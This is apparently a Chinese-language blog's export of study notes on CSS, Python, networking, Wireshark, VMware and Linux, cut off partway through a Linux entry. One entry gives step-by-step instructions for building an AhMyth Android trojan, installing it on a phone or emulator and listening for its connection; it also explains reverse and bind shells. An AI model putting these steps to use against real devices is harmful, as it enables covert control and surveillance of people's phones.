      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">html&lt;audio controls&gt;</span><br><span class="line">    &lt;source src=&quot;audio.mp3&quot; type=&quot;audio/mp3&quot;&gt;</span><br><span class="line">    Your browser does not support the audio tag.</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls&gt;</span><br><span class="line">    &lt;source src=&quot;movie.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    Your browser does not support the video tag.</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="CSS笔记："   >
          <a href="#CSS笔记：" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSS笔记：" class="headerlink" title="CSS笔记："></a>CSS笔记：</h2>
      
        <h3 id="1-选择器"   >
          <a href="#1-选择器" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-选择器" class="headerlink" title="1. 选择器"></a>1. 选择器</h3>
      <ul>
<li>类选择器：.classname</li>
<li>ID选择器：#id</li>
<li>元素选择器：element</li>
<li>后代选择器：ancestor descendant</li>
<li>直接子元素选择器：parent &gt; child</li>
<li>伪类选择器：:hover, :nth-child(n)</li>
</ul>

        <h3 id="2-样式规则"   >
          <a href="#2-样式规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-样式规则" class="headerlink" title="2. 样式规则"></a>2. 样式规则</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">css/* 基本样式规则 */</span><br><span class="line">body &#123;</span><br><span class="line">    font-family: &#x27;Arial&#x27;, sans-serif;</span><br><span class="line">    background-color: #f4f4f4;</span><br><span class="line">    color: #333;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 盒模型 */</span><br><span class="line">.container &#123;</span><br><span class="line">    width: 80%;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 文本样式 */</span><br><span class="line">h1 &#123;</span><br><span class="line">    font-size: 2em;</span><br><span class="line">    color: #0077cc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 背景和边框 */</span><br><span class="line">.box &#123;</span><br><span class="line">    background-color: #fff;</span><br><span class="line">    border: 1px solid #ddd;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 布局 */</span><br><span class="line">.flex-container &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    align-items: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 响应式设计 */</span><br><span class="line">@media screen and (max-width: 600px) &#123;</span><br><span class="line">    body &#123;</span><br><span class="line">        font-size: 14px;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-盒模型"   >
          <a href="#3-盒模型" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-盒模型" class="headerlink" title="3. 盒模型"></a>3. 盒模型</h3>
      <ul>
<li><p>内边距：padding</p>
</li>
<li><p>边框：border</p>
</li>
<li><p>外边距：margin</p>
</li>
<li><p>position:relative相对定位</p>
<p>top: 10px;向下移动10个像素</p>
<p>left: 100px 自左边距100像素开始</p>
<p>position:absolute绝对定位</p>
<p>position:fixed固定定位 一直显示在页面</p>
</li>
</ul>

        <h3 id="4-Flex布局"   >
          <a href="#4-Flex布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Flex布局" class="headerlink" title="4. Flex布局"></a>4. Flex布局</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">css.container &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    align-items: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>z - index:10;重叠元素 数字大的显示在上层</p>
<p>float浮动元素 float: right;</p>
<p>width: 275px;</p>
<p>margin: 5px;外边距5像素</p>
<p>margin:10px auto自动 居中</p>
<p>padding: 5px;内容与边框之间的距离</p>
<p>padding-top:20px;上内边距</p>
<p>padding-right:30px;右内边距</p>
<p>padding-bottom:30px;下内边距</p>
<p>padding-left:20px;左内边距</p>
<p>padding:1px四边统一内边距</p>
<p>padding:1px1px上下,左右内边距</p>
<p>padding:1px1px1px上,左右,下内边距</p>
<p>padding:1px1px1px1px上,右,下,左内边距</p>
<p>.clear{clear:left&#x2F;right&#x2F;both&#x2F;none}清除浮动</p>
<p>border:1px(线1像素) solid #665544;}</p>
<p>1.none:表示没 </p>
<p>2.solid：表示单线 </p>
<p>3.double：表示双线 </p>
<p>4.groove：表示凹槽 </p>
<p>5.redge:表示皱纹 </p>
<p>6.dotted:点线</p>
<p>7.dashed:虚线</p>
<p>8.dotted 方型点框</p>
<p>9.ridge &#x2F;outset 表示凸出</p>
<p>overflow:auto：在必需时对象内容才会被裁切或显示 滚动条；</p>
<p>hidden：不显示超过对象尺寸的内容；</p>
<p>scroll：总是显示滚动条。</p>
]]></content>
  </entry>
  <entry>
    <title>python列表</title>
    <url>/2023/12/05/text9/</url>
    <content><![CDATA[<p>1.列表的定义：能装东西的东西在python中用[]来表示一个列表。列表中的元素通过,隔开。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191351741.png" alt="image-20231210191351741"></p>
<p>2.列表的特性：有索引也有切片，索引超过范围会报错。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191509237.png" alt="image-20231210191509237"></p>
<p>可以for循环遍历</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191605440.png" alt="image-20231210191605440"></p>
<p>用len可以拿到列表长度</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210191658201.png" alt="image-20231210191658201"></p>
<p>3.列表的增删改查</p>
<p>（1）列表数据的增加</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192248026.png" alt="image-20231210192248026"></p>
<p>（2）列表数据的删除</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210192825012.png" alt="image-20231210192825012"></p>
<p>循环删除</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193135716.png" alt="image-20231210193135716"></p>
<p>（3）列表数据的修改</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193422914.png" alt="image-20231210193422914"></p>
<p>（4）列表数据的查询</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210193506419.png" alt="image-20231210193506419"></p>
<p>4.列表的循环</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195147475.png" alt="image-20231210195147475"></p>
<p>5.列表的其他操作</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200132744.png" alt="image-20231210200132744"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210200030146.png" alt="image-20231210200030146"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231210195930171.png" alt="image-20231210195930171"></p>
]]></content>
  </entry>
  <entry>
    <title>内网上网，三次握手四次挥手，Proxifier代理设置，VMware桥接和nat模式，Wireshark</title>
    <url>/2023/12/05/text8/</url>
    <content><![CDATA[
        <h1 id="n上网流程"   >
          <a href="#n上网流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#n上网流程" class="headerlink" title="n上网流程"></a>n上网流程</h1>
      
        <h1 id="内网上网"   >
          <a href="#内网上网" class="heading-link"><i class="fas fa-link"></i></a><a href="#内网上网" class="headerlink" title="内网上网"></a>内网上网</h1>
      <p>1.通过dhcp（Dynamic Host Configuration Protocol，动态主机配置协议）获得私网的IP地址，使用　NAT（Network Address Translation，网络地址转换）多个私网IP通过一个公网ip进行上网。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/v2-7736353d1437abb340cec1311fce0409_720w.webp" alt="v2-7736353d1437abb340cec1311fce0409_720w"></p>
<p>补充：私网地址范围（ A类地址:10.0.0.0<del>10.255.255.255 B类地址:172.16.0.0</del>172.31.255.255 C类地址:192.168.0.0~192.168.255.255）</p>
<p>2.路由器里面有路由表分为静态路由，默认路由，动态路由，根据路由表来选择下一跳地址进行数据传输上网。</p>

        <h1 id="三次握手，四次挥手"   >
          <a href="#三次握手，四次挥手" class="heading-link"><i class="fas fa-link"></i></a><a href="#三次握手，四次挥手" class="headerlink" title="三次握手，四次挥手"></a>三次握手，四次挥手</h1>
      <p><strong>三次握手</strong></p>
<p>三次握手的目的是在客户端和服务器之间建立一个可靠的、全双工的通信通道。整个过程包括以下步骤：</p>
<ol>
<li><strong>客户端向服务器发送SYN请求报文（SYN&#x3D;1，ACK&#x3D;0）：</strong><ul>
<li>客户端告诉服务器，它想要建立连接。</li>
<li>客户端选择一个初始序列号（ISN，Initial Sequence Number）。</li>
</ul>
</li>
<li><strong>服务器收到SYN请求报文，回应一个SYN和ACK的组合（SYN&#x3D;1，ACK&#x3D;1）：</strong><ul>
<li>服务器表示同意建立连接。</li>
<li>服务器也选择一个初始序列号。</li>
</ul>
</li>
<li><strong>客户端接收到服务器的响应后，再发送一个ACK报文给服务器（SYN&#x3D;0，ACK&#x3D;1）：</strong><ul>
<li>客户端告诉服务器，它已经收到了服务器的确认，连接建立完成。</li>
</ul>
</li>
</ol>
<p>在这个过程中，两端都向对方发送了确认信息，确保了双方都能够收到对方的确认，建立了可靠的连接。</p>
<p><strong>四次挥手</strong></p>
<p>四次挥手的目的是在客户端和服务器之间断开连接，整个过程包括以下步骤：</p>
<ol>
<li><strong>客户端发送一个带有FIN标志的报文给服务器（FIN&#x3D;1，ACK&#x3D;0）：</strong><ul>
<li>客户端不再发送数据，但仍然可以接收数据。</li>
<li>客户端选择一个序列号。</li>
</ul>
</li>
<li><strong>服务器收到客户端的FIN报文，回应一个ACK报文（FIN&#x3D;0，ACK&#x3D;1）：</strong><ul>
<li>服务器告诉客户端，它已经收到了客户端的断开请求。</li>
</ul>
</li>
<li><strong>服务器发送一个带有FIN标志的报文给客户端（FIN&#x3D;1，ACK&#x3D;1）：</strong><ul>
<li>服务器表示自己也准备好断开连接。</li>
<li>服务器选择一个序列号。</li>
</ul>
</li>
<li><strong>客户端收到服务器的FIN报文后，回应一个ACK报文（FIN&#x3D;0，ACK&#x3D;1）：</strong><ul>
<li>客户端告诉服务器，它已经收到了服务器的断开请求。</li>
<li>此时，连接正式断开。</li>
</ul>
</li>
</ol>
<p>在四次挥手中，由于TCP是全双工的，每一方都需要单独发起断开请求，确保双方都能安全地关闭连接。</p>

        <h1 id="Proxifier代理设置"   >
          <a href="#Proxifier代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#Proxifier代理设置" class="headerlink" title="Proxifier代理设置"></a>Proxifier代理设置</h1>
      <p>1.打开软件设置代理服务器</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192017805.png" alt="image-20231205192017805"></p>
<p>2.对代理服务器进行配置</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192340743.png" alt="image-20231205192340743"></p>
<p>3.设置代理规则来让什么网站和软件应用走代理</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192513853.png" alt="image-20231205192513853"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192541219.png" alt="image-20231205192541219"></p>

        <h1 id="VMware桥接和nat模式"   >
          <a href="#VMware桥接和nat模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#VMware桥接和nat模式" class="headerlink" title="VMware桥接和nat模式"></a>VMware桥接和nat模式</h1>
      <p><strong>桥接： 通过使用物理机网卡 具有单独ip</strong></p>
<p>在bridged模式下，VMWare虚拟出来的操作系统就像是局域网中的一台独立的主机，它可以访问网内任何一台机器。主机网卡和虚拟网卡的IP地址处于同一个网段，子网掩码、网关、DNS等参数都相同。</p>
<p>这种方式简单，直接将虚拟网卡桥接到一个物理网卡上面，和linux下一个网卡 绑定两个不同地址类似，实际上是将网卡设置为混杂模式，从而达到侦听多个IP的能力。在此种模式下，虚拟机内部的网卡（例如linux下的eth0)直接连到了物理网卡所在的网络上，可以想象为虚拟机和host机处于对等的地位，在网络关系上是平等的，没有谁在谁后面的问题。</p>
<p><strong>NAT ：把物理机为路由器进行上网</strong></p>
<p>使用NAT模式可以实现在虚拟系统里访问互联网。就是让虚拟系统借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205192852447.png" alt="image-20231205192852447"></p>

        <h1 id="Wireshark"   >
          <a href="#Wireshark" class="heading-link"><i class="fas fa-link"></i></a><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1>
      <p>1.选择要流量监控的网络接口</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193234605.png" alt="image-20231205193234605"></p>
<p>2.简单介绍部分意思</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193526589.png" alt="image-20231205193526589"></p>
<p>3.输入过滤条件可以筛选需要监控的流量信息</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231205193657914.png" alt="image-20231205193657914"></p>
]]></content>
  </entry>
  <entry>
    <title>python运算符，数字和字符串</title>
    <url>/2023/12/04/text7/</url>
    <content><![CDATA[
        <h1 id="Python算术运算符"   >
          <a href="#Python算术运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python算术运算符" class="headerlink" title="Python算术运算符"></a>Python算术运算符</h1>
      <p>运算符 + ：加 - 两个对象相加</p>
<p>运算符  - ：减 - 得到负数或是一个数减去另一个数</p>
<p>运算符 * ：乘 - 两个数相乘或是返回一个被重复若干次的字符串</p>
<p>运算符 &#x2F; ：除 - x 除以 y</p>
<p>运算符 % ：取模 - 返回除法的余数</p>
<p>运算符 **：幂 - 返回x的y次幂</p>
<p>运算符 &#x2F;&#x2F; ：取整除 - 往小的方向取整数</p>
<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204204846499.png" alt="image-20231204204846499"></p>

        <h1 id="Python-数字-Number"   >
          <a href="#Python-数字-Number" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字-Number" class="headerlink" title="Python 数字(Number)"></a>Python 数字(Number)</h1>
      <ul>
<li><p><strong>整型(int)</strong> - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。布尔(bool)是整型的子类型。</p>
</li>
<li><p><strong>浮点型(float)</strong> - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 &#x3D; 2.5 x 102 &#x3D; 250）</p>
</li>
<li><p><strong>复数( (complex))</strong> - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。</p>

        <h2 id="Python-数字类型转换"   >
          <a href="#Python-数字类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字类型转换" class="headerlink" title="Python 数字类型转换"></a>Python 数字类型转换</h2>
      <p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p>
<ul>
<li><strong>int(x)</strong> 将x转换为一个整数。</li>
<li><strong>float(x)</strong> 将x转换到一个浮点数。</li>
<li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li>
<li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li>
</ul>
</li>
</ul>

        <h1 id="Python-字符串"   >
          <a href="#Python-字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-字符串" class="headerlink" title="Python 字符串"></a>Python 字符串</h1>
      <p>字符串是 Python 中最常用的数据类型。我们可以使用引号( <strong>‘</strong> 或 <strong>“</strong> )来创建字符串。</p>
<p>Python 访问子字符串，可以使用方括号 <strong>[]</strong> 来截取字符串，字符串的截取的语法格式如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></div></figure>

<p>索引值以 <strong>0</strong> 为开始值，**-1** 为从末尾的开始位置。</p>
<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204205436471.png" alt="image-20231204205436471"></p>
<p>Python 的字符串的一些方法：</p>
<p>1.upper()转换字符串中的小写字母为大写</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204210946961.png" alt="image-20231204210946961"></p>
<p>2.strip()删除字符串2端的空格或指定字符</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211039648.png" alt="image-20231204211039648"></p>
<p>3.replace()字符串替换</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204211342982.png" alt="image-20231204211342982"></p>
<p>4.split()对字符串进行切割</p>
<p>5.join()拼接一个列表的内容成为新的字符串</p>
<p>6.startswith()判断字符串是否以xxx开头</p>
<p>7.len()字符串长度内置函数</p>
<p>8.字符串的循环和遍历<br>for C in S:<br>print(c) 字符串中的每一个字符<br>关于in:<br>1.判断xxx是否在xxxx中出现了<br>2.for循环</p>
]]></content>
  </entry>
  <entry>
    <title>正反向shell区别和安卓远控工具AhMyth的使用以及部分网络常识</title>
    <url>/2023/12/04/text6/</url>
    <content><![CDATA[
        <h1 id="正反向shell区别"   >
          <a href="#正反向shell区别" class="heading-link"><i class="fas fa-link"></i></a><a href="#正反向shell区别" class="headerlink" title="正反向shell区别"></a>正反向shell区别</h1>
      <p>1.反弹shell：</p>
<p>木马程序运行在被控制端，被控制端主动连接控制端</p>
<p>2.正向shell：</p>
<p>控制端主动发起连接去连接被控制端</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191035562.png" alt="image-20231204191035562"></p>

        <h1 id="安卓远控工具AhMyth的使用"   >
          <a href="#安卓远控工具AhMyth的使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓远控工具AhMyth的使用" class="headerlink" title="安卓远控工具AhMyth的使用"></a>安卓远控工具AhMyth的使用</h1>
      <p>1.生成木马程序</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191844438.png" alt="image-20231204191844438"></p>
<p>2.找到木马程序位置</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191952309.png" alt="image-20231204191952309"></p>
<p>3.将木马程序放入安卓手机或是模拟器当中安装并运行</p>
<p>4.点击监听按钮并打开运行按钮</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192410210.png" alt="image-20231204192410210"></p>
<p>5.<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192702390.png" alt="image-20231204192702390"></p>

        <h1 id="部分网络常识"   >
          <a href="#部分网络常识" class="heading-link"><i class="fas fa-link"></i></a><a href="#部分网络常识" class="headerlink" title="部分网络常识"></a>部分网络常识</h1>
      <p>1、什么是IP地址<br>IP地址就是给每个连接在Internet上的主机分配的一个32bit地址。按照CP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节,就是4个字节。包括主机地址和网络地址两部分。如11000000 10101000 00000001 00000110(192.168.1.6)</p>
<p>2、什么是子网掩码<br>子网掩码(subnet masking)的功能是告知主机或路由设备，地址的哪一部分是网络号，包括子网的网络号部分，哪一部分是主机号部分。子网掩码使用与IP地址相同的编址格式，即4个8位组的32位长格式。在子网掩码中，网络部分和子网络部分对应的位全为“1”，主机部分对应的位全为“0”通过将子网掩码与IP地址进行“与”操作,可提供所给定的IP地址所属的网络号(包括子网络号)。<br>3.可用的主机IP地址</p>
<p>去除网关地址和广播地址中间的部分就是可用的主机IP地址。</p>
<p>4.七层网络模型</p>
<ul>
<li><strong>物理层</strong>：</li>
</ul>
<p>解决两个硬件之间怎么通信的问题，常见的物理媒介有光纤、电缆、中继器等。它主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。</p>
<p>它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换）。这一层的数据叫做比特。</p>
<ul>
<li><strong>数据链路层：</strong></li>
</ul>
<p>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。该层的主要功能就是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p>
<p>它的具体工作是接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层。这一层的数据叫做帧。</p>
<ul>
<li><strong>网络层：</strong></li>
</ul>
<p>计算机网络中如果有多台计算机，怎么找到要发的那台？如果中间有多个节点，怎么选择路径？这就是路由要做的事。</p>
<p>该层的主要任务就是：通过路由选择算法，为报文（该层的数据单位，由上一层数据打包而来）通过通信子网选择最适当的路径。这一层定义的是IP地址，通过IP地址寻址，所以产生了IP协议。</p>
<ul>
<li><strong>传输层：</strong></li>
</ul>
<p>当发送大量数据时，很可能会出现丢包的情况，另一台电脑要告诉是否完整接收到全部的包。如果缺了，就告诉丢了哪些包，然后再发一次，直至全部接收为止。</p>
<p>简单来说，传输层的主要功能就是：监控数据传输服务的质量，保证报文的正确传输。</p>
<ul>
<li><strong>会话层：</strong></li>
</ul>
<p>虽然已经可以实现给正确的计算机，发送正确的封装过后的信息了。但我们总不可能每次都要调用传输层协议去打包，然后再调用IP协议去找路由，所以我们要建立一个自动收发包，自动寻址的功能。于是会话层出现了：它的作用就是建立和管理应用程序之间的通信。</p>
<ul>
<li><strong>表示层：</strong></li>
</ul>
<p>表示层负责数据格式的转换，将应用处理的信息转换为适合网络传输的格式，或者将来自下一层的数据转换为上层能处理的格式。</p>
<ul>
<li><strong>应用层：</strong></li>
</ul>
<p>应用层是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。前端同学对应用层肯定是最熟悉的。</p>
<p>5.常见协议端口号</p>
<ol>
<li><strong>HTTP (Hypertext Transfer Protocol)</strong><ul>
<li>默认端口：80</li>
<li>描述：用于在Web浏览器和Web服务器之间传输超文本的协议。</li>
</ul>
</li>
<li><strong>HTTPS (Hypertext Transfer Protocol Secure)</strong><ul>
<li>默认端口：443</li>
<li>描述：与HTTP类似，但通过TLS&#x2F;SSL加密传输数据，用于安全的Web通信。</li>
</ul>
</li>
<li><strong>FTP (File Transfer Protocol)</strong><ul>
<li>默认端口：21</li>
<li>描述：用于在网络上传输文件的标准协议。</li>
</ul>
</li>
<li><strong>SSH (Secure Shell)</strong><ul>
<li>默认端口：22</li>
<li>描述：用于通过加密的方式在网络上安全地访问和管理远程计算机。</li>
</ul>
</li>
<li><strong>SMTP (Simple Mail Transfer Protocol)</strong><ul>
<li>默认端口：25</li>
<li>描述：用于在网络上传输电子邮件的协议。</li>
</ul>
</li>
<li><strong>POP3 (Post Office Protocol version 3)</strong><ul>
<li>默认端口：110</li>
<li>描述：用于从邮件服务器接收电子邮件的协议。</li>
</ul>
</li>
<li><strong>IMAP (Internet Message Access Protocol)</strong><ul>
<li>默认端口：143</li>
<li>描述：允许邮件客户端从邮件服务器获取电子邮件的协议。</li>
</ul>
</li>
<li><strong>DNS (Domain Name System)</strong><ul>
<li>默认端口：53</li>
<li>描述：将域名转换为IP地址，实现域名解析的协议。</li>
</ul>
</li>
<li><strong>DHCP (Dynamic Host Configuration Protocol)</strong><ul>
<li>默认端口：67和68</li>
<li>描述：用于自动分配IP地址和其他网络配置信息给计算机的协议。</li>
</ul>
</li>
<li><strong>SNMP (Simple Network Management Protocol)</strong><ul>
<li>默认端口：161和162</li>
<li>描述：用于网络设备之间的管理和监控。</li>
</ul>
</li>
<li><strong>RDP (Remote Desktop Protocol)</strong><ul>
<li>默认端口：3389</li>
<li>描述：用于在远程计算机之间进行图形化桌面会话。</li>
</ul>
</li>
<li><strong>NTP (Network Time Protocol)</strong><ul>
<li>默认端口：123</li>
<li>描述：用于同步计算机时钟的协议。</li>
</ul>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>python安装与基础语法</title>
    <url>/2023/12/03/text5/</url>
    <content><![CDATA[
        <h1 id="1-python安装"   >
          <a href="#1-python安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-python安装" class="headerlink" title="1.python安装"></a>1.python安装</h1>
      <p>来到<span class="exturl"><a class="exturl__link"   href="https://so.csdn.net/so/search?q=Python%E5%AE%98%E7%BD%91&spm=1001.2101.3001.7020" >Python官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：<span class="exturl"><a class="exturl__link"   href="https://www.python.org/" >https://www.python.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>Downloads&gt;Windows：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161517785.png" alt="image-20231203161517785"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161653328.png" alt="image-20231203161653328"></p>
<p>点击链接下载python最新版本</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203161844634.png" alt="image-20231203161844634"></p>
<p>下载后点击安装：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4fe7fb7a95f941d5d7c06079c563899e.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/f09156cac5de4301fc14f84da0654f2e.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/57ff1575cde4ddfeb9c1697b3c7eb390.png" alt="img"></p>
<p>在本地电脑输入命令提示符：win+R</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1ab2553654d102f6a8371f8fea5b7ed9.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/fc81e83df580b7c6d7be15195f054407.png" alt="img"></p>

        <h1 id="2-python基础语法"   >
          <a href="#2-python基础语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-python基础语法" class="headerlink" title="2.python基础语法"></a>2.python基础语法</h1>
      
        <h2 id="标识符"   >
          <a href="#标识符" class="heading-link"><i class="fas fa-link"></i></a><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2>
      <ul>
<li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li>
<li>标识符的其他的部分由字母、数字和下划线组成。</li>
<li>标识符对大小写敏感。</li>
</ul>
<p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</p>
<hr>

        <h2 id="python关键字"   >
          <a href="#python关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#python关键字" class="headerlink" title="python关键字"></a>python关键字</h2>
      <p>关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import keyword</span><br><span class="line">&gt;&gt;&gt; keyword.kwlist</span><br><span class="line">[&#x27;False&#x27;, &#x27;None&#x27;, &#x27;True&#x27;, &#x27;and&#x27;, &#x27;as&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;continue&#x27;, &#x27;def&#x27;, &#x27;del&#x27;, &#x27;elif&#x27;, &#x27;else&#x27;, &#x27;except&#x27;, &#x27;finally&#x27;, &#x27;for&#x27;, &#x27;from&#x27;, &#x27;global&#x27;, &#x27;if&#x27;, &#x27;import&#x27;, &#x27;in&#x27;, &#x27;is&#x27;, &#x27;lambda&#x27;, &#x27;nonlocal&#x27;, &#x27;not&#x27;, &#x27;or&#x27;, &#x27;pass&#x27;, &#x27;raise&#x27;, &#x27;return&#x27;, &#x27;try&#x27;, &#x27;while&#x27;, &#x27;with&#x27;, &#x27;yield&#x27;]</span><br></pre></td></tr></table></div></figure>

<hr>

        <h2 id="注释"   >
          <a href="#注释" class="heading-link"><i class="fas fa-link"></i></a><a href="#注释" class="headerlink" title="注释"></a>注释</h2>
      <p>Python中单行注释以 <strong>#</strong> 开头，实例如下：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203163259585.png" alt="image-20231203163259585"></p>
<p>执行以上代码，输出结果为：</p>
<p>Hello Python！</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件与目录，创建新用户</title>
    <url>/2023/12/03/text4/</url>
    <content><![CDATA[
        <h1 id="1-Linux-系统目录结构"   >
          <a href="#1-Linux-系统目录结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Linux-系统目录结构" class="headerlink" title="1.Linux 系统目录结构"></a>1.Linux 系统目录结构</h1>
      <p>登录系统后，在当前命令窗口下输入命令：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">ls / </span><br></pre></td></tr></table></div></figure>

<p>你会看到如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/4_20.png" alt="img"></p>
<p>树状目录结构：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p>
<p>以下是对这些目录的解释：</p>
<ul>
<li><p><strong>&#x2F;bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p>
</li>
